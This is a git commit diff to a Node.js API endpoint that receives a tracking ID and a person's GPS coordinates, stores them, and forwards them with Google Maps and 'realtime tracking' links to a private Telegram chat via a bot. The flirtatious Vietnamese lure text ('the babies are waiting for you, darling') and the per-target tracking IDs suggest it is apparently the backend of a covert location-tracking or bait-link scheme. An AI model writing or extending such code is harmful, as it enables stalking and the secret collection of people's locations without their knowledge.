6c708affeba170be75c0b982e3552db9b8bd8108
letranbaongan123 <letranbaongan123@gmail.com>
2026-05-15 15:57:41 +0700

    full tracking telegram

--- api/location.js
+++ api/location.js
@@ -1,32 +1,73 @@
 const axios = require("axios");
 
+global.locations = global.locations || {};
+
 module.exports = async (req, res) => {
 
   if (req.method !== "POST") {
+
     return res.status(405).json({
       error: "Method not allowed"
     });
+
   }
 
   try {
 
-    const { lat, lng } = req.body;
+    const {
+      trackingId,
+      lat,
+      lng,
+      time
+    } = req.body;
+
+    global.locations[trackingId] = {
+      lat,
+      lng,
+      time
+    };
+
+    const trackingLink =
+      `${req.headers.origin}/track.html?id=${trackingId}`;
+
+    const googleMapsLink =
+      `https://maps.google.com/?q=${lat},${lng}`;
+
+    const currentTime =
+      new Date().toLocaleString("vi-VN");
 
     const message = `
-📍 Người dùng mới
+📍 Các bé đang đợi anh iu !
+🆔 Tracking ID:
+${trackingId}
 
-Latitude: ${lat}
-Longitude: ${lng}
+📌 Toạ độ hiện tại:
 
-https://maps.google.com/?q=${lat},${lng}
+Latitude:
+${lat}
+
+Longitude:
+${lng}
+
+🗺 Xem trên Google Maps:
+${googleMapsLink}
+
+🔗 Link theo dõi realtime:
+${trackingLink}
+
+⏱ Cập nhật lúc:
+${currentTime}
 `;
 
     await axios.post(
+
       `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+
       {
         chat_id: process.env.CHAT_ID,
         text: message
       }
+
     );
 
     return res.status(200).json({
@@ -41,4 +82,4 @@ https://maps.google.com/?q=${lat},${lng}
 
   }
 
-};
+}
